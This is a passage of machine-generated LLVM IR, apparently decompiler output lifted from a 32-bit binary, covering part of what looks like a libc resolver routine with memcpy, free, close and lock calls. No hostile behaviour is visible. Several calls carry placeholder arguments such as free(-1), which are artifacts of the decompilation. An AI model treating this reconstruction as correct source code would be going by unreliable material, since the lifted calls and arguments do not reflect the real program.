  store i32 %v3_80559ce, i32* %eax.global-to-local, align 4
  %v1_80559d1 = load i32, i32* @esp, align 4
  %v2_80559d1 = add i32 %v1_80559d1, 148
  %v3_80559d1 = inttoptr i32 %v2_80559d1 to i32*
  store i32 %v3_80559ce, i32* %v3_80559d1, align 4
  %v0_80559d8 = load i32, i32* @edi, align 4
  %v1_80559d8 = add i32 %v0_80559d8, 36
  %v2_80559d8 = inttoptr i32 %v1_80559d8 to i32*
  %v3_80559d8 = load i32, i32* %v2_80559d8, align 4
  store i32 %v3_80559d8, i32* %eax.global-to-local, align 4
  %v1_80559db = load i32, i32* @esp, align 4
  %v2_80559db = add i32 %v1_80559db, 152
  %v3_80559db = inttoptr i32 %v2_80559db to i32*
  store i32 %v3_80559d8, i32* %v3_80559db, align 4
  %v0_80559e2 = load i32, i32* @ecx, align 4
  %v1_80559e2 = load i32, i32* @esp, align 4
  %v2_80559e2 = add i32 %v1_80559e2, -4
  %v3_80559e2 = inttoptr i32 %v2_80559e2 to i32*
  store i32 %v0_80559e2, i32* %v3_80559e2, align 4
  %v1_80559e3 = add i32 %v1_80559e2, -8
  %v2_80559e3 = inttoptr i32 %v1_80559e3 to i32*
  store i32 40, i32* %v2_80559e3, align 4
  %v1_80559e5 = add i32 %v1_80559e2, 116
  store i32 %v1_80559e5, i32* %edx.global-to-local, align 4
  %v2_80559e9 = add i32 %v1_80559e2, -12
  %v3_80559e9 = inttoptr i32 %v2_80559e9 to i32*
  store i32 %v1_80559e5, i32* %v3_80559e9, align 4
  %v0_80559ea = load i32, i32* @edi, align 4
  %v2_80559ea = add i32 %v1_80559e2, -16
  %v3_80559ea = inttoptr i32 %v2_80559ea to i32*
  store i32 %v0_80559ea, i32* %v3_80559ea, align 4
  %v4_80559eb = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80555d8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80559eb, i32* %eax.global-to-local, align 4
  %v0_80559f0 = load i32, i32* @edi, align 4
  %v1_80559f0 = add i32 %v0_80559f0, 4
  %v2_80559f0 = inttoptr i32 %v1_80559f0 to i32*
  %v3_80559f0 = load i32, i32* %v2_80559f0, align 4
  store i32 %v3_80559f0, i32* %eax.global-to-local, align 4
  %v0_80559f3 = load i32, i32* @esp, align 4
  %v1_80559f3 = add i32 %v0_80559f3, 16
  %v9_80559f6 = icmp eq i32 %v3_80559f0, 24
  br i1 %v9_80559f6, label %dec_label_pc_80559c4.dec_label_pc_8055a1d_crit_edge, label %dec_label_pc_80559fb

dec_label_pc_80559c4.dec_label_pc_8055a1d_crit_edge: ; preds = %dec_label_pc_80559c4
  %.pre24 = add i32 %v0_80559f3, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8055a1d.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8055a1d

dec_label_pc_80559fb:                             ; preds = %dec_label_pc_80559c4
  %v1_80559fb = add i32 %v0_80559f0, 28
  %v2_80559fb = inttoptr i32 %v1_80559fb to i32*
  %v3_80559fb = load i32, i32* %v2_80559fb, align 4
  %v4_80559fb = icmp eq i32 %v3_80559fb, 0
  br i1 %v4_80559fb, label %dec_label_pc_8055aba, label %dec_label_pc_8055a05

dec_label_pc_8055a05:                             ; preds = %dec_label_pc_80559fb
  %v1_8055a05 = add i32 %v0_80559f3, 260
  %v2_8055a05 = inttoptr i32 %v1_8055a05 to i32*
  %v3_8055a05 = load i32, i32* %v2_8055a05, align 4
  %v12_8055a05 = icmp eq i32 %v3_8055a05, 1
  br i1 %v12_8055a05, label %dec_label_pc_8055a1d, label %dec_label_pc_8055a0f

dec_label_pc_8055a0f:                             ; preds = %dec_label_pc_8055a05
  %v12_8055a0f = icmp eq i32 %v3_8055a05, 28
  %v1_8055a17 = icmp eq i1 %v12_8055a0f, false
  br i1 %v1_8055a17, label %dec_label_pc_8055aba, label %dec_label_pc_8055a1d

dec_label_pc_8055a1d:                             ; preds = %dec_label_pc_80559c4.dec_label_pc_8055a1d_crit_edge, %dec_label_pc_8055a0f, %dec_label_pc_8055a05
  %v4_8055a1d = phi i32 [ %v4_8055a1d.pre, %dec_label_pc_80559c4.dec_label_pc_8055a1d_crit_edge ], [ %v3_8055a05, %dec_label_pc_8055a0f ], [ %v3_8055a05, %dec_label_pc_8055a05 ]
  %v15_8055a1d = icmp eq i32 %v3_80559f0, %v4_8055a1d
  br i1 %v15_8055a1d, label %dec_label_pc_8055a32, label %dec_label_pc_8055a26

dec_label_pc_8055a26:                             ; preds = %dec_label_pc_8055a1d
  %v1_8055a29 = inttoptr i32 %v0_80559f0 to i32*
  %v2_8055a29 = load i32, i32* %v1_8055a29, align 4
  %v5_8055a29 = inttoptr i32 %v0_80559f3 to i32*
  store i32 %v2_8055a29, i32* %v5_8055a29, align 4
  %v1_8055a2b = call i32 @free(i32 -1)
  store i32 %v1_8055a2b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055aa2

dec_label_pc_8055a32:                             ; preds = %dec_label_pc_8055a1d
  %v0_8055a32 = load i32, i32* @ebx, align 4
  %v1_8055a34 = sub i32 -1, %v0_8055a32
  store i32 %v1_8055a34, i32* %eax.global-to-local, align 4
  %v2_8055a36 = add i32 %v0_80559f3, 120
  %v3_8055a36 = inttoptr i32 %v2_8055a36 to i32*
  %v4_8055a36 = load i32, i32* %v3_8055a36, align 4
  %v5_8055a36 = add i32 %v4_8055a36, %v1_8055a34
  store i32 %v5_8055a36, i32* %eax.global-to-local, align 4
  %v2_8055a3a = add i32 %v0_80559f0, 36
  %v3_8055a3a = inttoptr i32 %v2_8055a3a to i32*
  store i32 %v5_8055a36, i32* %v3_8055a3a, align 4
  %v0_8055a3d = load i32, i32* @edi, align 4
  %v1_8055a3d = add i32 %v0_8055a3d, 16
  %v2_8055a3d = inttoptr i32 %v1_8055a3d to i32*
  %v3_8055a3d = load i32, i32* %v2_8055a3d, align 4
  %v1_8055a40 = add i32 %v3_8055a3d, 4
  store i32 %v1_8055a40, i32* %eax.global-to-local, align 4
  %v2_8055a43 = add i32 %v0_8055a3d, 36
  %v3_8055a43 = inttoptr i32 %v2_8055a43 to i32*
  %v4_8055a43 = load i32, i32* %v3_8055a43, align 4
  %v7_8055a43 = mul i32 %v4_8055a43, %v1_8055a40
  store i32 %v7_8055a43, i32* %eax.global-to-local, align 4
  %v2_8055a47 = add i32 %v0_8055a3d, 32
  %v3_8055a47 = inttoptr i32 %v2_8055a47 to i32*
  %v4_8055a47 = load i32, i32* %v3_8055a47, align 4
  %v6_8055a4a = icmp ugt i32 %v7_8055a43, %v4_8055a47
  br i1 %v6_8055a4a, label %dec_label_pc_8055a32.dec_label_pc_8055aba.loopexit_crit_edge, label %dec_label_pc_8055a4c

dec_label_pc_8055a32.dec_label_pc_8055aba.loopexit_crit_edge: ; preds = %dec_label_pc_8055a32
  %v0_8055aba.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055aba

dec_label_pc_8055a4c:                             ; preds = %dec_label_pc_8055a32
  store i32 0, i32* %v3_8055a43, align 4
  %v0_8055a53 = load i32, i32* @esp, align 4
  %v1_8055a53 = add i32 %v0_8055a53, 27
  %v2_8055a53 = inttoptr i32 %v1_8055a53 to i8*
  store i8 0, i8* %v2_8055a53, align 1
  %v1_8055aa5.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055aa5

dec_label_pc_8055a5a:                             ; preds = %dec_label_pc_80559b9
  %v1_8055a5d = add i32 %v0_805599a, 132
  %v2_8055a5d = inttoptr i32 %v1_8055a5d to i32*
  %v3_8055a5d = load i32, i32* %v2_8055a5d, align 4
  %v6_8055a5d = inttoptr i32 %v0_805599a to i32*
  store i32 %v3_8055a5d, i32* %v6_8055a5d, align 4
  %v1_8055a64 = call i32 @free(i32 -1)
  store i32 %v1_8055a64, i32* %eax.global-to-local, align 4
  %v0_8055a69 = load i32, i32* @esp, align 4
  %v1_8055a69 = add i32 %v0_8055a69, 16
  %v1_8055a6c = add i32 %v0_8055a69, 260
  %v2_8055a6c = inttoptr i32 %v1_8055a6c to i32*
  %v3_8055a6c = load i32, i32* %v2_8055a6c, align 4
  store i32 %v3_8055a6c, i32* %eax.global-to-local, align 4
  %v1_8055a73 = add i32 %v0_8055a69, 136
  %v2_8055a73 = inttoptr i32 %v1_8055a73 to i32*
  %v3_8055a73 = load i32, i32* %v2_8055a73, align 4
  %v15_8055a73 = icmp eq i32 %v3_8055a73, %v3_8055a6c
  %v1_8055a77 = icmp eq i1 %v15_8055a73, false
  br i1 %v1_8055a77, label %dec_label_pc_8055aa5, label %dec_label_pc_8055a79

dec_label_pc_8055a79:                             ; preds = %dec_label_pc_8055a5a
  %v0_8055a79 = load i32, i32* @edi, align 4
  %v1_8055a79 = add i32 %v0_8055a79, 16
  %v2_8055a79 = inttoptr i32 %v1_8055a79 to i32*
  %v3_8055a79 = load i32, i32* %v2_8055a79, align 4
  store i32 %v3_8055a79, i32* %eax.global-to-local, align 4
  %v2_8055a7c = add i32 %v0_8055a69, 148
  %v3_8055a7c = inttoptr i32 %v2_8055a7c to i32*
  %v4_8055a7c = load i32, i32* %v3_8055a7c, align 4
  %v15_8055a7c = icmp eq i32 %v3_8055a79, %v4_8055a7c
  %v1_8055a83 = icmp eq i1 %v15_8055a7c, false
  br i1 %v1_8055a83, label %dec_label_pc_8055b3f, label %dec_label_pc_8055a89

dec_label_pc_8055a89:                             ; preds = %dec_label_pc_8055a79
  %v0_8055a89 = load i32, i32* @edx, align 4
  %v2_8055a89 = add i32 %v0_8055a69, 12
  %v3_8055a89 = inttoptr i32 %v2_8055a89 to i32*
  store i32 %v0_8055a89, i32* %v3_8055a89, align 4
  %v0_8055a8a = load i32, i32* %eax.global-to-local, align 4
  %v2_8055a8a = add i32 %v0_8055a69, 8
  %v3_8055a8a = inttoptr i32 %v2_8055a8a to i32*
  store i32 %v0_8055a8a, i32* %v3_8055a8a, align 4
  %v1_8055a8b = add i32 %v0_8055a69, 152
  %v2_8055a8b = inttoptr i32 %v1_8055a8b to i32*
  %v3_8055a8b = load i32, i32* %v2_8055a8b, align 4
  %v5_8055a8b = add i32 %v0_8055a69, 4
  %v6_8055a8b = inttoptr i32 %v5_8055a8b to i32*
  store i32 %v3_8055a8b, i32* %v6_8055a8b, align 4
  %v0_8055a92 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055a92 = load i32, i32* @edi, align 4
  %v2_8055a92 = add i32 %v1_8055a92, 36
  %v3_8055a92 = inttoptr i32 %v2_8055a92 to i32*
  %v4_8055a92 = load i32, i32* %v3_8055a92, align 4
  %v7_8055a92 = mul i32 %v4_8055a92, %v0_8055a92
  store i32 %v7_8055a92, i32* %eax.global-to-local, align 4
  %v2_8055a96 = add i32 %v1_8055a92, 28
  %v3_8055a96 = inttoptr i32 %v2_8055a96 to i32*
  %v4_8055a96 = load i32, i32* %v3_8055a96, align 4
  %v5_8055a96 = add i32 %v4_8055a96, %v7_8055a92
  store i32 %v5_8055a96, i32* %eax.global-to-local, align 4
  %v3_8055a99 = inttoptr i32 %v0_8055a69 to i32*
  store i32 %v5_8055a96, i32* %v3_8055a99, align 4
  %v4_8055a9a = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80555d8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8055a9a, i32* %eax.global-to-local, align 4
  %v0_8055a9f = load i32, i32* @edi, align 4
  %v1_8055a9f = add i32 %v0_8055a9f, 36
  %v2_8055a9f = inttoptr i32 %v1_8055a9f to i32*
  %v3_8055a9f = load i32, i32* %v2_8055a9f, align 4
  %v4_8055a9f = add i32 %v3_8055a9f, 1
  store i32 %v4_8055a9f, i32* %v2_8055a9f, align 4
  br label %dec_label_pc_8055aa2

dec_label_pc_8055aa2:                             ; preds = %dec_label_pc_8055a26, %dec_label_pc_8055a89
  %v0_8055aa2 = load i32, i32* @esp, align 4
  %v1_8055aa2 = add i32 %v0_8055aa2, 16
  br label %dec_label_pc_8055aa5

dec_label_pc_8055aa5:                             ; preds = %dec_label_pc_8055a5a, %dec_label_pc_8055a4c, %dec_label_pc_8055aa2
  %v1_8055aa5 = phi i32 [ %v1_8055a69, %dec_label_pc_8055a5a ], [ %v1_8055aa5.pre, %dec_label_pc_8055a4c ], [ %v1_8055aa2, %dec_label_pc_8055aa2 ]
  %v0_8055aa5 = load i32, i32* @esi, align 4
  %v2_8055aa5 = add i32 %v1_8055aa5, 52
  %v3_8055aa5 = inttoptr i32 %v2_8055aa5 to i32*
  %v4_8055aa5 = load i32, i32* %v3_8055aa5, align 4
  %v5_8055aa5 = add i32 %v4_8055aa5, %v0_8055aa5
  store i32 %v5_8055aa5, i32* @esi, align 4
  %v0_8055aa9 = load i32, i32* @ebx, align 4
  %v1_8055aa9 = add i32 %v0_8055aa9, 1
  store i32 %v1_8055aa9, i32* @ebx, align 4
  %v2_8055aaa = add i32 %v1_8055aa5, 104
  %v3_8055aaa = inttoptr i32 %v2_8055aaa to i32*
  %v4_8055aaa = load i32, i32* %v3_8055aaa, align 4
  %v5_8055aaa = sub i32 %v1_8055aa9, %v4_8055aaa
  %v11_8055aaa = xor i32 %v4_8055aaa, %v1_8055aa9
  %v12_8055aaa = xor i32 %v5_8055aaa, %v1_8055aa9
  %v13_8055aaa = and i32 %v12_8055aaa, %v11_8055aaa
  %v14_8055aaa = icmp slt i32 %v13_8055aaa, 0
  %v16_8055aaa = icmp slt i32 %v5_8055aaa, 0
  %v2_8055aae = icmp eq i1 %v16_8055aaa, %v14_8055aaa
  br i1 %v2_8055aae, label %dec_label_pc_8055aba, label %dec_label_pc_8055ab0

dec_label_pc_8055ab0:                             ; preds = %dec_label_pc_8055ab0.lr.ph, %dec_label_pc_8055aa5
  %v0_8055ab0 = phi i32 [ %v0_8055ab0.pre, %dec_label_pc_8055ab0.lr.ph ], [ %v5_8055aa5, %dec_label_pc_8055aa5 ]
  %v0_805598667 = phi i32 [ %v1_8055aaa.pre, %dec_label_pc_8055ab0.lr.ph ], [ %v1_8055aa5, %dec_label_pc_8055aa5 ]
  %v2_8055ab0 = add i32 %v0_805598667, 16
  %v3_8055ab0 = inttoptr i32 %v2_8055ab0 to i32*
  %v4_8055ab0 = load i32, i32* %v3_8055ab0, align 4
  %v5_8055ab0 = sub i32 %v0_8055ab0, %v4_8055ab0
  %v11_8055ab0 = xor i32 %v4_8055ab0, %v0_8055ab0
  %v12_8055ab0 = xor i32 %v5_8055ab0, %v0_8055ab0
  %v13_8055ab0 = and i32 %v12_8055ab0, %v11_8055ab0
  %v14_8055ab0 = icmp slt i32 %v13_8055ab0, 0
  %v16_8055ab0 = icmp slt i32 %v5_8055ab0, 0
  %v2_8055ab4 = icmp eq i1 %v16_8055ab0, %v14_8055ab0
  br i1 %v2_8055ab4, label %dec_label_pc_8055aba, label %dec_label_pc_8055986

dec_label_pc_8055aba:                             ; preds = %dec_label_pc_80559a9, %dec_label_pc_805597a, %dec_label_pc_8055aa5, %dec_label_pc_80559fb, %dec_label_pc_8055a0f, %dec_label_pc_8055ab0, %dec_label_pc_8055a32.dec_label_pc_8055aba.loopexit_crit_edge
  %v0_8055aba = phi i32 [ %v0_8055aba.pre.pre, %dec_label_pc_8055a32.dec_label_pc_8055aba.loopexit_crit_edge ], [ %v1_8055aaa.pre, %dec_label_pc_805597a ], [ %v1_8055aa5, %dec_label_pc_8055aa5 ], [ %v1_80559f3, %dec_label_pc_80559fb ], [ %v1_80559f3, %dec_label_pc_8055a0f ], [ %v0_805598667, %dec_label_pc_8055ab0 ], [ %v1_805599a, %dec_label_pc_80559a9 ]
  %v1_8055abd = add i32 %v0_8055aba, 20
  %v2_8055abd = inttoptr i32 %v1_8055abd to i32*
  %v3_8055abd = load i32, i32* %v2_8055abd, align 4
  %v5_8055abd = add i32 %v0_8055aba, -16
  %v6_8055abd = inttoptr i32 %v5_8055abd to i32*
  store i32 %v3_8055abd, i32* %v6_8055abd, align 4
  %v1_8055ac1 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8055ac1, i32* %eax.global-to-local, align 4
  %v0_8055ac6 = load i32, i32* @esp, align 4
  %v1_8055ac9 = add i32 %v0_8055ac6, 272
  %v2_8055ac9 = inttoptr i32 %v1_8055ac9 to i32*
  %v3_8055ac9 = load i32, i32* %v2_8055ac9, align 4
  %v4_8055ac9 = icmp eq i32 %v3_8055ac9, 0
  br i1 %v4_8055ac9, label %dec_label_pc_8055ade, label %dec_label_pc_8055ad3

dec_label_pc_8055ad3:                             ; preds = %dec_label_pc_8055aba
  store i32 %v3_8055ac9, i32* %edx.global-to-local, align 4
  %v2_8055ada = inttoptr i32 %v3_8055ac9 to i32*
  store i32 %v2_805554a, i32* %v2_8055ada, align 4
  %v0_8055aea.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055aea

dec_label_pc_8055ade:                             ; preds = %dec_label_pc_8055aba
  %v3_8055ae1 = inttoptr i32 %v0_8055ac6 to i32*
  store i32 %v2_805554a, i32* %v3_8055ae1, align 4
  %v1_8055ae2 = call i32 @free(i32 -1)
  store i32 %v1_8055ae2, i32* %eax.global-to-local, align 4
  %v0_8055ae7 = load i32, i32* @esp, align 4
  %v1_8055ae7 = add i32 %v0_8055ae7, 16
  br label %dec_label_pc_8055aea

dec_label_pc_8055aea:                             ; preds = %dec_label_pc_8055ad3, %dec_label_pc_8055ade
  %v0_8055aea = phi i32 [ %v0_8055aea.pre, %dec_label_pc_8055ad3 ], [ %v1_8055ae7, %dec_label_pc_8055ade ]
  %v1_8055aed = add i32 %v0_8055aea, 12
  %v2_8055aed = inttoptr i32 %v1_8055aed to i32*
  %v3_8055aed = load i32, i32* %v2_8055aed, align 4
  %v5_8055aed = add i32 %v0_8055aea, -16
  %v6_8055aed = inttoptr i32 %v5_8055aed to i32*
  store i32 %v3_8055aed, i32* %v6_8055aed, align 4
  %v1_8055af1 = call i32 @free(i32 -1)
  store i32 %v1_8055af1, i32* @eax, align 4
  %v0_8055af6 = load i32, i32* @esp, align 4
  %v1_8055af9 = add i32 %v0_8055af6, 8
  %v2_8055af9 = inttoptr i32 %v1_8055af9 to i32*
  store i32 ptrtoint (i8** @global_var_80687e8.787 to i32), i32* %v2_8055af9, align 4
  %v1_8055afe = add i32 %v0_8055af6, 4
  %v2_8055afe = inttoptr i32 %v1_8055afe to i32*
  store i32 134562299, i32* %v2_8055afe, align 4
  %v1_8055b03 = add i32 %v0_8055af6, 200
  store i32 %v1_8055b03, i32* %ebx.global-to-local, align 4
  %v3_8055b0a = inttoptr i32 %v0_8055af6 to i32*
  store i32 %v1_8055b03, i32* %v3_8055b0a, align 4
  %v2_8055b0b = call i32 @__pthread_return_void(i32 -1, i32 %v15_80555d8)
  store i32 %v2_8055b0b, i32* %eax.global-to-local, align 4
  %v0_8055b10 = load i32, i32* @esp, align 4
  %v1_8055b10 = inttoptr i32 %v0_8055b10 to i32*
  store i32 ptrtoint (i8** @global_var_80687e8.787 to i32), i32* %v1_8055b10, align 4
  %v1_8055b17 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8055b17, i32* %eax.global-to-local, align 4
  %v0_8055b1c = load i32, i32* @esp, align 4
  %v1_8055b1c = add i32 %v0_8055b1c, 56
  %v2_8055b1c = inttoptr i32 %v1_8055b1c to i32*
  %v3_8055b1c = load i32, i32* %v2_8055b1c, align 4
  store i32 %v3_8055b1c, i32* @eax, align 4
  %v1_8055b20 = add i32 %v0_8055b1c, 60
  %v2_8055b20 = inttoptr i32 %v1_8055b20 to i32*
  %v3_8055b20 = load i32, i32* %v2_8055b20, align 4
  store i32 %v3_8055b20, i32* %edx.global-to-local, align 4
  %v1_8055b24 = inttoptr i32 %v0_8055b1c to i32*
  %v3_8055b24 = add i32 %v0_8055b1c, 4
  %v1_8055b25 = inttoptr i32 %v3_8055b24 to i32*
  %v1_8055b26 = sext i32 %v3_8055b1c to i64
  store i64 %v1_8055b26, i64* @global_var_8068800.788, align 2048
  %v1_8055b2b = trunc i32 %v3_8055b20 to i16
  store i16 %v1_8055b2b, i16* @global_var_8062544.789, align 4
  store i32 1, i32* %v1_8055b25, align 4
  %v0_8055b34 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055b34, i32* %v1_8055b24, align 4
  %v2_8055b35 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80555d8)
  store i32 %v2_8055b35, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055c76

dec_label_pc_8055b3f:                             ; preds = %dec_label_pc_8055a79
  %v1_8055b42 = inttoptr i32 %v0_8055a79 to i32*
  %v2_8055b42 = load i32, i32* %v1_8055b42, align 4
  %v5_8055b42 = inttoptr i32 %v0_8055a69 to i32*
  store i32 %v2_8055b42, i32* %v5_8055b42, align 4
  %v1_8055b44 = call i32 @free(i32 -1)
  store i32 %v1_8055b44, i32* @eax, align 4
  %v0_8055b49 = load i32, i32* @esp, align 4
  %v1_8055b49 = add i32 %v0_8055b49, 16
  br label %dec_label_pc_8055b4c

dec_label_pc_8055b4c:                             ; preds = %dec_label_pc_805587e, %dec_label_pc_80559a9, %dec_label_pc_80559a1, %dec_label_pc_805593d, %dec_label_pc_80558c3, %dec_label_pc_805589f, %dec_label_pc_8055b3f
  %v1_8055b53 = phi i32 [ %v1_8055893, %dec_label_pc_805587e ], [ %v1_805599a, %dec_label_pc_80559a9 ], [ %v1_805599a, %dec_label_pc_80559a1 ], [ %v1_80558b4, %dec_label_pc_805593d ], [ %v1_80558b4, %dec_label_pc_80558c3 ], [ %v1_80558b4, %dec_label_pc_805589f ], [ %v1_8055b49, %dec_label_pc_8055b3f ]
  %v1_8055b4c = add i32 %v1_8055b53, 51
  %v2_8055b4c = inttoptr i32 %v1_8055b4c to i8*
  %v3_8055b4c = load i8, i8* %v2_8055b4c, align 1
  %v4_8055b4c = icmp eq i8 %v3_8055b4c, 0
  %v1_8055b51 = icmp eq i1 %v4_8055b4c, false
  br i1 %v1_8055b51, label %dec_label_pc_8055b97, label %dec_label_pc_8055b53

dec_label_pc_8055b53:                             ; preds = %dec_label_pc_8055b4c
  %v0_8055b53 = load i32, i32* @ecx, align 4
  %v2_8055b53 = add i32 %v1_8055b53, -4
  %v3_8055b53 = inttoptr i32 %v2_8055b53 to i32*
  store i32 %v0_8055b53, i32* %v3_8055b53, align 4
  %v1_8055b54 = add i32 %v1_8055b53, -8
  %v2_8055b54 = inttoptr i32 %v1_8055b54 to i32*
  store i32 ptrtoint (i32* @global_var_8062548.726 to i32), i32* %v2_8055b54, align 4
  %v1_8055b59 = add i32 %v1_8055b53, -12
  %v2_8055b59 = inttoptr i32 %v1_8055b59 to i32*
  store i32 134562299, i32* %v2_8055b59, align 4
  %v1_8055b5e = add i32 %v1_8055b53, 184
  store i32 %v1_8055b5e, i32* @esi, align 4
  %v2_8055b65 = add i32 %v1_8055b53, -16
  %v3_8055b65 = inttoptr i32 %v2_8055b65 to i32*
  store i32 %v1_8055b5e, i32* %v3_8055b65, align 4
  %v2_8055b66 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80555d8)
  store i32 %v2_8055b66, i32* %eax.global-to-local, align 4
  %v0_8055b6b = load i32, i32* @esp, align 4
  %v1_8055b6b = inttoptr i32 %v0_8055b6b to i32*
  store i32 ptrtoint (i32* @global_var_8062548.726 to i32), i32* %v1_8055b6b, align 4
  %v1_8055b72 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8055b72, i32* %eax.global-to-local, align 4
  %v0_8055b77 = load i32, i32* @global_var_8068c38.790, align 8
  store i32 %v0_8055b77, i32* %ebx.global-to-local, align 4
  %v0_8055b7d = load i32, i32* @esp, align 4
  %v1_8055b7d = inttoptr i32 %v0_8055b7d to i32*
  %v2_8055b7d = load i32, i32* %v1_8055b7d, align 4
  store i32 %v2_8055b7d, i32* @eax, align 4
  %v3_8055b7d = add i32 %v0_8055b7d, 4
  %v1_8055b7e = inttoptr i32 %v3_8055b7d to i32*
  %v2_8055b7e = load i32, i32* %v1_8055b7e, align 4
  store i32 %v2_8055b7e, i32* %edx.global-to-local, align 4
  %v1_8055b7f = add i32 %v0_8055b77, -1
  store i32 %v1_8055b7f, i32* @ebx, align 4
  store i32 1, i32* %v1_8055b7e, align 4
  %v0_8055b82 = load i32, i32* @esi, align 4
  store i32 %v0_8055b82, i32* %v1_8055b7d, align 4
  %v2_8055b83 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80555d8)
  store i32 %v2_8055b83, i32* %eax.global-to-local, align 4
  %v0_8055b88 = load i32, i32* @esp, align 4
  %v1_8055b88 = add i32 %v0_8055b88, 16
  %v1_8055b8b = add i32 %v0_8055b88, 52
  %v2_8055b8b = inttoptr i32 %v1_8055b8b to i32*
  %v3_8055b8b = load i32, i32* %v2_8055b8b, align 4
  %v4_8055b8b = load i32, i32* @ebx, align 4
  %v5_8055b8b = sub i32 %v3_8055b8b, %v4_8055b8b
  %v11_8055b8b = xor i32 %v4_8055b8b, %v3_8055b8b
  %v12_8055b8b = xor i32 %v5_8055b8b, %v3_8055b8b
  %v13_8055b8b = and i32 %v12_8055b8b, %v11_8055b8b
  %v14_8055b8b = icmp slt i32 %v13_8055b8b, 0
  %v16_8055b8b = icmp slt i32 %v5_8055b8b, 0
  %v2_8055b8f = icmp eq i1 %v16_8055b8b, %v14_8055b8b
  br i1 %v2_8055b8f, label %dec_label_pc_8055b97, label %dec_label_pc_8055b91

dec_label_pc_8055b91:                             ; preds = %dec_label_pc_8055b53
  %v4_8055b91 = add i32 %v3_8055b8b, 1
  store i32 %v4_8055b91, i32* %v2_8055b8b, align 4
  br label %dec_label_pc_8055bb8.backedge

dec_label_pc_8055b97:                             ; preds = %dec_label_pc_8055820, %dec_label_pc_8055b53, %dec_label_pc_8055b4c, %dec_label_pc_8055837
  %v1_8055ba6 = phi i32 [ %v1_8055b88, %dec_label_pc_8055b53 ], [ %v1_8055b53, %dec_label_pc_8055b4c ], [ %v1_8055873, %dec_label_pc_8055837 ], [ %v0_8055b97.pre, %dec_label_pc_8055820 ]
  %v1_8055b97 = add i32 %v1_8055ba6, 40
  %v2_8055b97 = inttoptr i32 %v1_8055b97 to i32*
  %v3_8055b97 = load i32, i32* %v2_8055b97, align 4
  %v1_8055b9b = add i32 %v3_8055b97, 1
  store i32 %v1_8055b9b, i32* %eax.global-to-local, align 4
  %v1_8055b9c = ashr i32 %v1_8055b9b, 31
  store i32 %v1_8055b9c, i32* %edx.global-to-local, align 4
  %v1_8055b9d = add i32 %v1_8055ba6, 248
  %v2_8055b9d = inttoptr i32 %v1_8055b9d to i32*
  %v3_8055b9d = load i32, i32* %v2_8055b9d, align 4
  %v5_8055b9d = zext i32 %v1_8055b9b to i64
  %v7_8055b9d = zext i32 %v1_8055b9c to i64
  %v8_8055b9d = mul nuw i64 %v7_8055b9d, 4294967296
  %v9_8055b9d = or i64 %v8_8055b9d, %v5_8055b9d
  %v10_8055b9d = zext i32 %v3_8055b9d to i64
  %v11_8055b9d = sdiv i64 %v9_8055b9d, %v10_8055b9d
  %v12_8055b9d = trunc i64 %v11_8055b9d to i32
  store i32 %v12_8055b9d, i32* %eax.global-to-local, align 4
  %v13_8055b9d = srem i64 %v9_8055b9d, %v10_8055b9d
  %v14_8055b9d = trunc i64 %v13_8055b9d to i32
  store i32 %v14_8055b9d, i32* %edx.global-to-local, align 4
  %v1_8055ba4 = icmp eq i32 %v14_8055b9d, 0
  store i32 %v14_8055b9d, i32* %v2_8055b97, align 4
  %v1_8055baa = icmp eq i1 %v1_8055ba4, false
  br i1 %v1_8055baa, label %dec_label_pc_8055bb0, label %dec_label_pc_8055bac

dec_label_pc_8055bac:                             ; preds = %dec_label_pc_8055b97
  %v0_8055bac = load i32, i32* @esp, align 4
  %v1_8055bac = add i32 %v0_8055bac, 28
  %v2_8055bac = inttoptr i32 %v1_8055bac to i32*
  %v3_8055bac = load i32, i32* %v2_8055bac, align 4
  %v4_8055bac = add i32 %v3_8055bac, 1
  store i32 %v4_8055bac, i32* %v2_8055bac, align 4
  br label %dec_label_pc_8055bb0

dec_label_pc_8055bb0:                             ; preds = %dec_label_pc_8055b97, %dec_label_pc_8055bac
  %v0_8055bb0 = load i32, i32* @esp, align 4
  %v1_8055bb0 = add i32 %v0_8055bb0, 36
  %v2_8055bb0 = inttoptr i32 %v1_8055bb0 to i32*
  store i32 -1, i32* %v2_8055bb0, align 4
  br label %dec_label_pc_8055bb8.backedge

dec_label_pc_8055bb8.backedge:                    ; preds = %dec_label_pc_8055bb0, %dec_label_pc_805582e, %dec_label_pc_805591c, %dec_label_pc_8055b91
  %v0_8055bb8.pre = load i32, i32* @esp, align 4
  %v1_8055bb8 = add i32 %v0_8055bb8.pre, 28
  %v2_8055bb8 = inttoptr i32 %v1_8055bb8 to i32*
  %v3_8055bb8 = load i32, i32* %v2_8055bb8, align 4
  %tmp110 = icmp ult i32 %v3_8055bb8, 3
  br i1 %tmp110, label %dec_label_pc_8055618, label %dec_label_pc_8055bdd

dec_label_pc_8055bdd:                             ; preds = %dec_label_pc_8055592, %dec_label_pc_805562e, %dec_label_pc_8055722, %dec_label_pc_8055bb8.backedge, %entry, %dec_label_pc_805556c, %dec_label_pc_8055574, %dec_label_pc_8055582
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_8055582 ], [ -1, %dec_label_pc_8055574 ], [ -1, %dec_label_pc_805556c ], [ -1, %entry ], [ %v0_80555df, %dec_label_pc_8055bb8.backedge ], [ %v0_80555df, %dec_label_pc_8055722 ], [ %v0_80555df, %dec_label_pc_805562e ], [ %v0_80555df, %dec_label_pc_8055592 ]
  %v0_8055bdd = call i32 @__GI___h_errno_location()
  store i32 %v0_8055bdd, i32* %eax.global-to-local, align 4
